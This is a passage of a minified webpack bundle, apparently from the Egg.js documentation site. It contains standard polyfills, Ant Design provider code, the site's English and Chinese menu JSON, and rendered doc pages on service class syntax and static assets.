L=Object(o["a"])((function(){return A}),A,(function(e,t){var n=Object.keys(e),a=Object.keys(t);return n.length!==a.length||n.some((function(n){return e[n]!==t[n]}))})),T=i["useMemo"]((function(){return{prefixCls:j,csp:u}}),[j,u]),N=s,O={};return g&&(O=(null===(t=g.Form)||void 0===t?void 0:t.defaultValidateMessages)||(null===(n=c["a"].Form)||void 0===n?void 0:n.defaultValidateMessages)||{}),p&&p.validateMessages&&(O=Object(a["a"])(Object(a["a"])({},O),p.validateMessages)),Object.keys(O).length>0&&(N=i["createElement"](l["b"],{validateMessages:O},s)),g&&(N=i["createElement"](h,{locale:g,_ANT_MARK__:m},N)),(j||u)&&(N=i["createElement"](r["a"].Provider,{value:T},N)),f&&(N=i["createElement"](P["a"],{size:f},N)),void 0!==S&&(N=i["createElement"](I["a"],{disabled:S},N)),i["createElement"](b["b"].Provider,{value:L},N)},H=function(e){return i["useEffect"]((function(){e.direction&&(f["b"].config({rtl:"rtl"===e.direction}),E["a"].config({rtl:"rtl"===e.direction}))}),[e.direction]),i["createElement"](g["a"],null,(function(t,n,r){return i["createElement"](b["a"],null,(function(t){return i["createElement"](z,Object(a["a"])({parentContext:t,legacyLocale:r},e))}))}))};H.ConfigContext=b["b"],H.SizeContext=P["b"],H.config=D;t["a"]=H},sBM8:function(e,t,n){"use strict";function a(e){if("undefined"!==typeof Symbol&&null!=e[Symbol.iterator]||null!=e["@@iterator"])return Array.from(e)}n.d(t,"a",(function(){return a}))},sDrD:function(e,t,n){var a=n("A0UU");e.exports=a},szvL:function(e,t,n){"use strict";var a=n("0mt+"),r=n("fd2C"),l=n("tS9j"),o=n("lz/I"),i=n("Kdrj"),c=i.codeAt,s=i.charAt,u="String Iterator",d=o.set,m=o.getterFor(u),p=r((function(e){d(this,{type:u,string:e,index:0})}),"String",(function(){var e,t=m(this),n=t.string,a=t.index;return a>=n.length?{value:void 0,done:!0}:(e=s(n,a),t.index+=e.length,{value:{codePoint:c(e,0),position:a},done:!1})}));a({target:"String",proto:!0},{codePoints:function(){return new p(String(l(this)))}})},t08b:function(e){e.exports=JSON.parse('{"menus":{"en-US":{"*":[{"path":"/","title":"egg - Born to build better enterprise frameworks and apps","meta":{}}],"/advanced":[{"path":"/advanced","title":"Advanced","meta":{"order":0}},{"path":"/advanced/loader","title":"Loader","meta":{"order":1}},{"path":"/advanced/plugin","title":"Plugin Development","meta":{"order":2}},{"path":"/advanced/framework","title":"Framework Development","meta":{"order":3}},{"path":"/advanced/cluster-client","title":"Multi-Process Development Model Enhancement","meta":{"order":4}},{"path":"/advanced/view-plugin","title":"View Plugin Development","meta":{"order":5}},{"path":"/advanced/loader-update","title":"Upgrade your event functions in your lifecycle","meta":{"order":6}}],"/basics":[{"path":"/basics","title":"Basic","meta":{"order":0}},{"path":"/basics/structure","title":"Structure","meta":{"order":1}},{"path":"/basics/objects","title":"Framework Built-in Objects","meta":{"order":2}},{"path":"/basics/env","title":"Runtime Environment","meta":{"order":3}},{"path":"/basics/config","title":"Configuration","meta":{"order":4}},{"path":"/basics/middleware","title":"Middleware","meta":{"order":5}},{"path":"/basics/router","title":"Router","meta":{"order":6}},{"path":"/basics/controller","title":"Controller","meta":{"order":7}},{"path":"/basics/service","title":"Service","meta":{"order":8}},{"path":"/basics/plugin","title":"Plugin","meta":{"order":9}},{"path":"/basics/schedule","title":"Scheduled Tasks","meta":{"order":10}},{"path":"/basics/extend","title":"Extend EGG","meta":{"order":11}},{"path":"/basics/app-start","title":"Application Startup Configuration","meta":{"order":12}}],"/community":[{"path":"/community","title":"Community","meta":{"order":0}},{"path":"/community/faq","title":"FAQ","meta":{"order":3}},{"path":"/community/contributing","title":"Contribution Guide","meta":{}},{"path":"/community/style-guide","title":"Code Style Guide","meta":{}}],"/core":[{"path":"/core","title":"Core","meta":{"order":0}},{"path":"/core/development","title":"Local Development","meta":{"order":1}},{"path":"/core/unittest","title":"Unit Testing","meta":{"order":2}},{"path":"/core/deployment","title":"Deployment","meta":{"order":3}},{"path":"/core/logger","title":"Logger","meta":{"order":4}},{"path":"/core/httpclient","title":"HttpClient","meta":{"order":5}},{"path":"/core/cookie-and-session","title":"Cookie and Session","meta":{"order":6}},{"path":"/core/cluster-and-ipc","title":"Multi-Process Model and Inter-Process Communication","meta":{"order":7}},{"path":"/core/view","title":"View Template Rendering","meta":{"order":8}},{"path":"/core/error-handling","title":"Exception Handling","meta":{"order":9}},{"path":"/core/security","title":"Security","meta":{"order":10}},{"path":"/core/i18n","title":"I18n Internationalization","meta":{"order":11}}],"/intro":[{"path":"/intro","title":"What is Egg?","meta":{"order":0}},{"path":"/intro/egg-and-koa","title":"Egg and Koa","meta":{"order":1}},{"path":"/intro/quickstart","title":"Quick Start","meta":{"order":2}},{"path":"/intro/progressive","title":"Progressive Development","meta":{"order":3}},{"path":"/intro/migration","title":"Egg@2 Upgrade guideline","meta":{"order":4}}],"/tutorials":[{"path":"/tutorials","title":"Tutorials","meta":{}},{"path":"/tutorials/assets","title":"Assets","meta":{}},{"path":"/tutorials/mysql","title":"MySQL","meta":{}},{"path":"/tutorials/passport","title":"Passport","meta":{}},{"path":"/tutorials/proxy","title":"Behind a Proxy","meta":{}},{"path":"/tutorials/restful","title":"Build RESTful API","meta":{}},{"path":"/tutorials/sequelize","title":"Sequelize","meta":{}},{"path":"/tutorials/socketio","title":"Socket.IO","meta":{}},{"path":"/tutorials/typescript","title":"TypeScript","meta":{}}]},"zh-CN":{"*":[{"path":"/zh-CN","title":"egg - \u4e3a\u4f01\u4e1a\u7ea7\u6846\u67b6\u548c\u5e94\u7528\u800c\u751f","meta":{}}],"/zh-CN/advanced":[{"path":"/zh-CN/advanced","title":"\u8fdb\u9636","meta":{"order":0}},{"path":"/zh-CN/advanced/loader","title":"\u52a0\u8f7d\u5668\uff08Loader\uff09","meta":{"order":1}},{"path":"/zh-CN/advanced/plugin","title":"\u63d2\u4ef6\u5f00\u53d1","meta":{"order":2}},{"path":"/zh-CN/advanced/framework","title":"\u6846\u67b6\u5f00\u53d1","meta":{"order":3}},{"path":"/zh-CN/advanced/cluster-client","title":"\u591a\u8fdb\u7a0b\u7814\u53d1\u6a21\u5f0f\u589e\u5f3a","meta":{"order":4}},{"path":"/zh-CN/advanced/view-plugin","title":"View \u63d2\u4ef6\u5f00\u53d1","meta":{"order":5}},{"path":"/zh-CN/advanced/loader-update","title":"\u5347\u7ea7\u4f60\u7684\u751f\u547d\u5468\u671f\u4e8b\u4ef6\u51fd\u6570","meta":{"order":6}}],"/zh-CN/basics":[{"path":"/zh-CN/basics","title":"\u57fa\u7840\u529f\u80fd","meta":{"order":0}},{"path":"/zh-CN/basics/structure","title":"\u76ee\u5f55\u7ed3\u6784","meta":{"order":1}},{"path":"/zh-CN/basics/objects","title":"\u6846\u67b6\u5185\u7f6e\u57fa\u7840\u5bf9\u8c61","meta":{"order":2}},{"path":"/zh-CN/basics/env","title":"\u8fd0\u884c\u73af\u5883","meta":{"order":3}},{"path":"/zh-CN/basics/config","title":"Config \u914d\u7f6e","meta":{"order":4}},{"path":"/zh-CN/basics/middleware","title":"\u4e2d\u95f4\u4ef6\uff08Middleware\uff09","meta":{"order":5}},{"path":"/zh-CN/basics/router","title":"\u8def\u7531\uff08Router\uff09","meta":{"order":6}},{"path":"/zh-CN/basics/controller","title":"\u63a7\u5236\u5668\uff08Controller\uff09","meta":{"order":7}},{"path":"/zh-CN/basics/service","title":"\u670d\u52a1\uff08Service\uff09","meta":{"order":8}},{"path":"/zh-CN/basics/plugin","title":"\u63d2\u4ef6","meta":{"order":9}},{"path":"/zh-CN/basics/schedule","title":"\u5b9a\u65f6\u4efb\u52a1","meta":{"order":10}},{"path":"/zh-CN/basics/extend","title":"\u6846\u67b6\u6269\u5c55","meta":{"order":11}},{"path":"/zh-CN/basics/app-start","title":"\u542f\u52a8\u81ea\u5b9a\u4e49","meta":{"order":12}}],"/zh-CN/community":[{"path":"/zh-CN/community","title":"\u793e\u533a","meta":{"order":0}},{"path":"/zh-CN/community/faq","title":"\u5e38\u89c1\u95ee\u9898","meta":{"order":3}},{"path":"/zh-CN/community/contributing","title":"\u4ee3\u7801\u8d21\u732e\u89c4\u8303","meta":{}},{"path":"/zh-CN/community/style-guide","title":"\u4ee3\u7801\u98ce\u683c\u6307\u5357","meta":{}}],"/zh-CN/core":[{"path":"/zh-CN/core","title":"\u6838\u5fc3\u529f\u80fd","meta":{"order":0}},{"path":"/zh-CN/core/development","title":"\u672c\u5730\u5f00\u53d1","meta":{"order":1}},{"path":"/zh-CN/core/unittest","title":"\u5355\u5143\u6d4b\u8bd5","meta":{"order":2}},{"path":"/zh-CN/core/deployment","title":"\u5e94\u7528\u90e8\u7f72","meta":{"order":3}},{"path":"/zh-CN/core/logger","title":"\u65e5\u5fd7","meta":{"order":4}},{"path":"/zh-CN/core/httpclient","title":"HttpClient","meta":{"order":5}},{"path":"/zh-CN/core/cookie-and-session","title":"Cookie \u4e0e Session","meta":{"order":6}},{"path":"/zh-CN/core/cluster-and-ipc","title":"\u591a\u8fdb\u7a0b\u6a21\u578b\u548c\u8fdb\u7a0b\u95f4\u901a\u8baf","meta":{"order":7}},{"path":"/zh-CN/core/view","title":"View \u6a21\u677f\u6e32\u67d3","meta":{"order":8}},{"path":"/zh-CN/core/error-handling","title":"\u5f02\u5e38\u5904\u7406","meta":{"order":9}},{"path":"/zh-CN/core/security","title":"\u5b89\u5168","meta":{"order":10}},{"path":"/zh-CN/core/i18n","title":"\u56fd\u9645\u5316\uff08I18n\uff09","meta":{"order":11}}],"/zh-CN/intro":[{"path":"/zh-CN/intro","title":"Egg.js \u662f\u4ec0\u4e48?","meta":{"order":0}},{"path":"/zh-CN/intro/egg-and-koa","title":"Egg.js \u4e0e Koa","meta":{"order":1}},{"path":"/zh-CN/intro/quickstart","title":"\u5feb\u901f\u5165\u95e8","meta":{"order":2}},{"path":"/zh-CN/intro/progressive","title":"\u6e10\u8fdb\u5f0f\u5f00\u53d1","meta":{"order":3}},{"path":"/zh-CN/intro/migration","title":"Egg@2 \u5347\u7ea7\u6307\u5357","meta":{"order":4}}],"/zh-CN/tutorials":[{"path":"/zh-CN/tutorials","title":"\u6559\u7a0b","meta":{}},{"path":"/zh-CN/tutorials/assets","title":"\u9759\u6001\u8d44\u6e90","meta":{}},{"path":"/zh-CN/tutorials/mysql","title":"MySQL","meta":{}},{"path":"/zh-CN/tutorials/passport","title":"Passport","meta":{}},{"path":"/zh-CN/tutorials/proxy","title":"\u524d\u7f6e\u4ee3\u7406\u6a21\u5f0f","meta":{}},{"path":"/zh-CN/tutorials/restful","title":"\u5b9e\u73b0 RESTful API","meta":{}},{"path":"/zh-CN/tutorials/sequelize","title":"Sequelize","meta":{}},{"path":"/zh-CN/tutorials/socketio","title":"Socket.IO","meta":{}},{"path":"/zh-CN/tutorials/typescript","title":"TypeScript","meta":{}}]}},"locales":[{"name":"en-US","label":"English"},{"name":"zh-CN","label":"\u4e2d\u6587"}],"navs":{"en-US":[{"path":"/intro","title":"Intro","order":1},{"path":"/tutorials","title":"Tutorials","order":2},{"path":"/core","title":"Core","order":3},{"path":"/basics","title":"Basic","order":4},{"path":"/advanced","title":"Advanced","order":5},{"path":"/community","title":"Community","order":6},{"title":"GitHub","path":"https://github.com/eggjs/egg"},{"title":"Release","path":"https://github.com/eggjs/egg/releases"},{"title":"Plugins","path":"https://github.com/search?q=topic%3Aegg-plugin&type=Repositories"}],"zh-CN":[{"path":"/zh-CN/intro","title":"\u6307\u5357","order":1},{"path":"/zh-CN/tutorials","title":"\u6559\u7a0b","order":2},{"path":"/zh-CN/core","title":"\u6838\u5fc3\u529f\u80fd","order":3},{"path":"/zh-CN/basics","title":"\u57fa\u7840\u529f\u80fd","order":4},{"path":"/zh-CN/advanced","title":"\u8fdb\u9636","order":5},{"path":"/zh-CN/community","title":"\u793e\u533a","order":6},{"title":"GitHub","path":"https://github.com/eggjs/egg"},{"title":"\u63d2\u4ef6\u5217\u8868","path":"https://github.com/search?q=topic%3Aegg-plugin&type=Repositories"},{"title":"\u53d1\u5e03\u65e5\u5fd7","path":"https://github.com/eggjs/egg/releases"}]},"title":"Egg","logo":"/logo.svg","description":"Born to build better enterprise frameworks and apps","mode":"site","repository":{"url":"https://github.com/eggjs/egg","branch":"master"},"theme":{"links":[{"title":"Resources","list":[{"name":"Egg","url":"https://github.com/eggjs/egg"},{"name":"Organization","url":"https://github.com/eggjs"}]},{"title":"XTech","list":[{"name":"EggJS - \u4f01\u4e1a\u7ea7 Node.js \u5f00\u53d1\u6846\u67b6","url":"https://eggjs.org"},{"name":"Ant Design - UI \u4f53\u7cfb","url":"https://ant.design"},{"name":"AntV - \u6570\u636e\u53ef\u89c6\u5316","url":"https://antv.vision"},{"name":"\u8bed\u96c0 - \u77e5\u8bc6\u521b\u4f5c\u4e0e\u5206\u4eab\u5de5\u5177","url":"https://www.yuque.com"}]},{"title":"Community","list":[{"name":"CNode \u793e\u533a","url":"https://cnodejs.org/"},{"name":"Node.js \u4e13\u680f","url":"https://www.yuque.com/egg/nodejs"},{"name":"\u63d0\u4ea4\u53cd\u9988","url":"https://github.com/eggjs/egg/issues"},{"name":"\u53d1\u5e03\u65e5\u5fd7","url":"https://github.com/eggjs/egg/releases"}]},{"title":"Egg.js Telegram Channel","list":[{"name":"\u9489\u9489","qrcode":"/img_egg/qrcode_egg_channel.png"}]}]},"exportStatic":{}}')},t6MI:function(e,t,n){"use strict";n.d(t,"a",(function(){return r}));var a=n("FU0I");function r(e){var t=a["useRef"]();t.current=e;var n=a["useCallback"]((function(){for(var e,n=arguments.length,a=new Array(n),r=0;r<n;r++)a[r]=arguments[r];return null===(e=t.current)||void 0===e?void 0:e.call.apply(e,[t].concat(a))}),[]);return n}},tLo1:function(e,t,n){"use strict";var a=n("0mt+"),r=n("a7jj"),l=n("YtQ9"),o=n("wzTy"),i=n("N0Us"),c=n("AcHn"),s=n("ESQ9"),u=n("q7Pv"),d=n("mIyh"),m=n("hOjR"),p=d("slice"),h=m("slice",{ACCESSORS:!0,0:0,1:2}),g=u("species"),f=[].slice,E=Math.max;a({target:"Array",proto:!0,forced:!p||!h},{slice:function(e,t){var n,a,u,d=c(this),m=i(d.length),p=o(e,m),h=o(void 0===t?m:t,m);if(l(d)&&(n=d.constructor,"function"!=typeof n||n!==Array&&!l(n.prototype)?r(n)&&(n=n[g],null===n&&(n=void 0)):n=void 0,n===Array||void 0===n))return f.call(d,p,h);for(a=new(void 0===n?Array:n)(E(h-p,0)),u=0;p<h;p++,u++)p in d&&s(a,u,d[p]);return a.length=u,a}})},tPcN:function(e,t,n){"use strict";var a=n("V3tB"),r=n("u3TI"),l=n("q7Pv"),o=n("9Rcy"),i=l("species");e.exports=function(e){var t=a(e),n=r.f;o&&t&&!t[i]&&n(t,i,{configurable:!0,get:function(){return this}})}},tPrM:function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("V3tB"),o=n("oyD1"),i=n("XaNN"),c=n("j9ts"),s=n("NBU9");a({target:"Set",proto:!0,real:!0,forced:r},{symmetricDifference:function(e){var t=o(this),n=new(c(t,l("Set")))(t),a=i(n["delete"]),r=i(n.add);return s(e,(function(e){a.call(n,e)||r.call(n,e)})),n}})},tS9j:function(e,t){e.exports=function(e){if(void 0==e)throw TypeError("Can't call method on "+e);return e}},tbdv:function(e,t,n){var a,r=n("oyD1"),l=n("lwrH"),o=n("M+A8"),i=n("pX0n"),c=n("Tx0u"),s=n("U16M"),u=n("VPwr"),d=">",m="<",p="prototype",h="script",g=u("IE_PROTO"),f=function(){},E=function(e){return m+h+d+e+m+"/"+h+d},b=function(e){e.write(E("")),e.close();var t=e.parentWindow.Object;return e=null,t},v=function(){var e,t=s("iframe"),n="java"+h+":";return t.style.display="none",c.appendChild(t),t.src=String(n),e=t.contentWindow.document,e.open(),e.write(E("document.F=Object")),e.close(),e.F},y=function(){try{a=document.domain&&new ActiveXObject("htmlfile")}catch(t){}y=a?b(a):v();var e=o.length;while(e--)delete y[p][o[e]];return y()};i[g]=!0,e.exports=Object.create||function(e,t){var n;return null!==e?(f[p]=r(e),n=new f,f[p]=null,n[g]=e):n=y(),void 0===t?n:l(n,t)}},tc2K:function(e,t,n){"use strict";var a=n("0mt+"),r=n("PAgB"),l=n("jdHz");a({target:"Promise",stat:!0},{try:function(e){var t=r.f(this),n=l(e);return(n.error?t.reject:t.resolve)(n.value),t.promise}})},th5x:function(e,t,n){"use strict";var a,r=SyntaxError,l=Function,o=TypeError,i=function(e){try{return l('"use strict"; return ('+e+").constructor;")()}catch(t){}},c=Object.getOwnPropertyDescriptor;if(c)try{c({},"")}catch(O){c=null}var s=function(){throw new o},u=c?function(){try{return s}catch(e){try{return c(arguments,"callee").get}catch(t){return s}}}():s,d=n("8wvZ")(),m=n("Bn3C")(),p=Object.getPrototypeOf||(m?function(e){return e.__proto__}:null),h={},g="undefined"!==typeof Uint8Array&&p?p(Uint8Array):a,f={"%AggregateError%":"undefined"===typeof AggregateError?a:AggregateError,"%Array%":Array,"%ArrayBuffer%":"undefined"===typeof ArrayBuffer?a:ArrayBuffer,"%ArrayIteratorPrototype%":d&&p?p([][Symbol.iterator]()):a,"%AsyncFromSyncIteratorPrototype%":a,"%AsyncFunction%":h,"%AsyncGenerator%":h,"%AsyncGeneratorFunction%":h,"%AsyncIteratorPrototype%":h,"%Atomics%":"undefined"===typeof Atomics?a:Atomics,"%BigInt%":"undefined"===typeof BigInt?a:BigInt,"%BigInt64Array%":"undefined"===typeof BigInt64Array?a:BigInt64Array,"%BigUint64Array%":"undefined"===typeof BigUint64Array?a:BigUint64Array,"%Boolean%":Boolean,"%DataView%":"undefined"===typeof DataView?a:DataView,"%Date%":Date,"%decodeURI%":decodeURI,"%decodeURIComponent%":decodeURIComponent,"%encodeURI%":encodeURI,"%encodeURIComponent%":encodeURIComponent,"%Error%":Error,"%eval%":eval,"%EvalError%":EvalError,"%Float32Array%":"undefined"===typeof Float32Array?a:Float32Array,"%Float64Array%":"undefined"===typeof Float64Array?a:Float64Array,"%FinalizationRegistry%":"undefined"===typeof FinalizationRegistry?a:FinalizationRegistry,"%Function%":l,"%GeneratorFunction%":h,"%Int8Array%":"undefined"===typeof Int8Array?a:Int8Array,"%Int16Array%":"undefined"===typeof Int16Array?a:Int16Array,"%Int32Array%":"undefined"===typeof Int32Array?a:Int32Array,"%isFinite%":isFinite,"%isNaN%":isNaN,"%IteratorPrototype%":d&&p?p(p([][Symbol.iterator]())):a,"%JSON%":"object"===typeof JSON?JSON:a,"%Map%":"undefined"===typeof Map?a:Map,"%MapIteratorPrototype%":"undefined"!==typeof Map&&d&&p?p((new Map)[Symbol.iterator]()):a,"%Math%":Math,"%Number%":Number,"%Object%":Object,"%parseFloat%":parseFloat,"%parseInt%":parseInt,"%Promise%":"undefined"===typeof Promise?a:Promise,"%Proxy%":"undefined"===typeof Proxy?a:Proxy,"%RangeError%":RangeError,"%ReferenceError%":ReferenceError,"%Reflect%":"undefined"===typeof Reflect?a:Reflect,"%RegExp%":RegExp,"%Set%":"undefined"===typeof Set?a:Set,"%SetIteratorPrototype%":"undefined"!==typeof Set&&d&&p?p((new Set)[Symbol.iterator]()):a,"%SharedArrayBuffer%":"undefined"===typeof SharedArrayBuffer?a:SharedArrayBuffer,"%String%":String,"%StringIteratorPrototype%":d&&p?p(""[Symbol.iterator]()):a,"%Symbol%":d?Symbol:a,"%SyntaxError%":r,"%ThrowTypeError%":u,"%TypedArray%":g,"%TypeError%":o,"%Uint8Array%":"undefined"===typeof Uint8Array?a:Uint8Array,"%Uint8ClampedArray%":"undefined"===typeof Uint8ClampedArray?a:Uint8ClampedArray,"%Uint16Array%":"undefined"===typeof Uint16Array?a:Uint16Array,"%Uint32Array%":"undefined"===typeof Uint32Array?a:Uint32Array,"%URIError%":URIError,"%WeakMap%":"undefined"===typeof WeakMap?a:WeakMap,"%WeakRef%":"undefined"===typeof WeakRef?a:WeakRef,"%WeakSet%":"undefined"===typeof WeakSet?a:WeakSet};if(p)try{null.error}catch(O){var E=p(p(O));f["%Error.prototype%"]=E}var b=function e(t){var n;if("%AsyncFunction%"===t)n=i("async function () {}");else if("%GeneratorFunction%"===t)n=i("function* () {}");else if("%AsyncGeneratorFunction%"===t)n=i("async function* () {}");else if("%AsyncGenerator%"===t){var a=e("%AsyncGeneratorFunction%");a&&(n=a.prototype)}else if("%AsyncIteratorPrototype%"===t){var r=e("%AsyncGenerator%");r&&p&&(n=p(r.prototype))}return f[t]=n,n},v={"%ArrayBufferPrototype%":["ArrayBuffer","prototype"],"%ArrayPrototype%":["Array","prototype"],"%ArrayProto_entries%":["Array","prototype","entries"],"%ArrayProto_forEach%":["Array","prototype","forEach"],"%ArrayProto_keys%":["Array","prototype","keys"],"%ArrayProto_values%":["Array","prototype","values"],"%AsyncFunctionPrototype%":["AsyncFunction","prototype"],"%AsyncGenerator%":["AsyncGeneratorFunction","prototype"],"%AsyncGeneratorPrototype%":["AsyncGeneratorFunction","prototype","prototype"],"%BooleanPrototype%":["Boolean","prototype"],"%DataViewPrototype%":["DataView","prototype"],"%DatePrototype%":["Date","prototype"],"%ErrorPrototype%":["Error","prototype"],"%EvalErrorPrototype%":["EvalError","prototype"],"%Float32ArrayPrototype%":["Float32Array","prototype"],"%Float64ArrayPrototype%":["Float64Array","prototype"],"%FunctionPrototype%":["Function","prototype"],"%Generator%":["GeneratorFunction","prototype"],"%GeneratorPrototype%":["GeneratorFunction","prototype","prototype"],"%Int8ArrayPrototype%":["Int8Array","prototype"],"%Int16ArrayPrototype%":["Int16Array","prototype"],"%Int32ArrayPrototype%":["Int32Array","prototype"],"%JSONParse%":["JSON","parse"],"%JSONStringify%":["JSON","stringify"],"%MapPrototype%":["Map","prototype"],"%NumberPrototype%":["Number","prototype"],"%ObjectPrototype%":["Object","prototype"],"%ObjProto_toString%":["Object","prototype","toString"],"%ObjProto_valueOf%":["Object","prototype","valueOf"],"%PromisePrototype%":["Promise","prototype"],"%PromiseProto_then%":["Promise","prototype","then"],"%Promise_all%":["Promise","all"],"%Promise_reject%":["Promise","reject"],"%Promise_resolve%":["Promise","resolve"],"%RangeErrorPrototype%":["RangeError","prototype"],"%ReferenceErrorPrototype%":["ReferenceError","prototype"],"%RegExpPrototype%":["RegExp","prototype"],"%SetPrototype%":["Set","prototype"],"%SharedArrayBufferPrototype%":["SharedArrayBuffer","prototype"],"%StringPrototype%":["String","prototype"],"%SymbolPrototype%":["Symbol","prototype"],"%SyntaxErrorPrototype%":["SyntaxError","prototype"],"%TypedArrayPrototype%":["TypedArray","prototype"],"%TypeErrorPrototype%":["TypeError","prototype"],"%Uint8ArrayPrototype%":["Uint8Array","prototype"],"%Uint8ClampedArrayPrototype%":["Uint8ClampedArray","prototype"],"%Uint16ArrayPrototype%":["Uint16Array","prototype"],"%Uint32ArrayPrototype%":["Uint32Array","prototype"],"%URIErrorPrototype%":["URIError","prototype"],"%WeakMapPrototype%":["WeakMap","prototype"],"%WeakSetPrototype%":["WeakSet","prototype"]},y=n("j9mU"),k=n("fXgJ"),w=y.call(Function.call,Array.prototype.concat),x=y.call(Function.apply,Array.prototype.splice),j=y.call(Function.call,String.prototype.replace),S=y.call(Function.call,String.prototype.slice),C=y.call(Function.call,RegExp.prototype.exec),A=/[^%.[\]]+|\[(?:(-?\d+(?:\.\d+)?)|(["'])((?:(?!\2)[^\\]|\\.)*?)\2)\]|(?=(?:\.|\[\])(?:\.|\[\]|%$))/g,L=/\\(\\)?/g,T=function(e){var t=S(e,0,1),n=S(e,-1);if("%"===t&&"%"!==n)throw new r("invalid intrinsic syntax, expected closing `%`");if("%"===n&&"%"!==t)throw new r("invalid intrinsic syntax, expected opening `%`");var a=[];return j(e,A,(function(e,t,n,r){a[a.length]=n?j(r,L,"$1"):t||e})),a},N=function(e,t){var n,a=e;if(k(v,a)&&(n=v[a],a="%"+n[0]+"%"),k(f,a)){var l=f[a];if(l===h&&(l=b(a)),"undefined"===typeof l&&!t)throw new o("intrinsic "+e+" exists, but is not available. Please file an issue!");return{alias:n,name:a,value:l}}throw new r("intrinsic "+e+" does not exist!")};e.exports=function(e,t){if("string"!==typeof e||0===e.length)throw new o("intrinsic name must be a non-empty string");if(arguments.length>1&&"boolean"!==typeof t)throw new o('"allowMissing" argument must be a boolean');if(null===C(/^%?[^%]*%?$/,e))throw new r("`%` may not be present anywhere but at the beginning and end of the intrinsic name");var n=T(e),a=n.length>0?n[0]:"",l=N("%"+a+"%",t),i=l.name,s=l.value,u=!1,d=l.alias;d&&(a=d[0],x(n,w([0,1],d)));for(var m=1,p=!0;m<n.length;m+=1){var h=n[m],g=S(h,0,1),E=S(h,-1);if(('"'===g||"'"===g||"`"===g||'"'===E||"'"===E||"`"===E)&&g!==E)throw new r("property names with quotes must have matching quotes");if("constructor"!==h&&p||(u=!0),a+="."+h,i="%"+a+"%",k(f,i))s=f[i];else if(null!=s){if(!(h in s)){if(!t)throw new o("base intrinsic for "+e+" exists, but the property is not available.");return}if(c&&m+1>=n.length){var b=c(s,h);p=!!b,s=p&&"get"in b&&!("originalValue"in b.get)?b.get:s[h]}else p=k(s,h),s=s[h];p&&!u&&(f[i]=s)}}return s}},tk4r:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"Developers are advised to use ",r.a.createElement("code",null,"npm init egg --type=simple showcase")," to generate and observe the recommended project structure and configuration."),r.a.createElement("h2",{id:"classify"},r.a.createElement(l["AnchorLink"],{to:"#classify","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Classify"),r.a.createElement("p",null,"Old Style:"),r.a.createElement(o["a"],{code:"module.exports = (app) => {\n  class UserService extends app.Service {\n    async list() {\n      return await this.ctx.curl('https://eggjs.org');\n    }\n  }\n  return UserService;\n};",lang:"js"}),r.a.createElement("p",null,"change to:"),r.a.createElement(o["a"],{code:"const Service = require('egg').Service;\nclass UserService extends Service {\n  async list() {\n    return await this.ctx.curl('https://eggjs.org');\n  }\n}\nmodule.exports = UserService;",lang:"js"}),r.a.createElement("p",null,"Additionally, the ",r.a.createElement("code",null,"framework developer")," needs to change the syntax as follows, otherwise the ",r.a.createElement("code",null,"application developer")," will have problems customizing base classes such as Service:"),r.a.createElement(o["a"],{code:"const egg = require('egg');\n\nmodule.exports = Object.assign(egg, {\n  Application: class MyApplication extends egg.Application {\n    // ...\n  },\n  // ...\n});",lang:"js"}),r.a.createElement("h2",{id:"private-properties--lazy-initialization"},r.a.createElement(l["AnchorLink"],{to:"#private-properties--lazy-initialization","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Private Properties & Lazy Initialization"),r.a.createElement("ul",null,r.a.createElement("li",null,"Private properties are mounted with ",r.a.createElement("code",null,"Symbol"),"."),r.a.createElement("li",null,"The description of Symbol follows the rules of jsdoc, describing the mapped class name + attribute name."),r.a.createElement("li",null,"Delayed initialization.")),r.a.createElement(o["a"],{code:"// app/extend/application.js\nconst CACHE = Symbol('Application#cache');\nconst CacheManager = require('../../lib/cache_manager');\n\nmodule.exports = {\n  get cache() {\n    if (!this[CACHE]) {\n      this[CACHE] = new CacheManager(this);\n    }\n    return this[CACHE];\n  },\n};",lang:"js"})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},"tlk/":function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("V3tB"),o=n("oyD1"),i=n("XaNN"),c=n("G9w8"),s=n("j9ts"),u=n("AOzO"),d=n("NBU9");a({target:"Map",proto:!0,real:!0,forced:r},{mapValues:function(e){var t=o(this),n=u(t),a=c(e,arguments.length>1?arguments[1]:void 0,3),r=new(s(t,l("Map"))),m=i(r.set);return d(n,(function(e,n){m.call(r,e,a(n,e,t))}),void 0,!0,!0),r}})},tqSL:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-assets"},"egg-view-assets")," \u63d0\u4f9b\u4e86\u901a\u7528\u7684\u9759\u6001\u8d44\u6e90\u7ba1\u7406\u548c\u672c\u5730\u5f00\u53d1\u65b9\u6848\uff0c\u6709\u5982\u4e0b\u529f\u80fd"),r.a.createElement("ol",null,r.a.createElement("li",null,"\u4e00\u4f53\u5316\u672c\u5730\u5f00\u53d1\u65b9\u6848"),r.a.createElement("li",null,"\u751f\u4ea7\u73af\u5883\u9759\u6001\u8d44\u6e90\u6620\u5c04"),r.a.createElement("li",null,"\u548c\u6a21\u677f\u5f15\u64ce\u96c6\u6210"),r.a.createElement("li",null,"\u5728",r.a.createElement(l["AnchorLink"],{to:"#%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7%E7%BA%A6%E5%AE%9A"},"\u7ea6\u5b9a\u4e0b"),"\u53ef\u4f7f\u7528\u591a\u79cd\u6784\u5efa\u5de5\u5177\uff0c\u5982 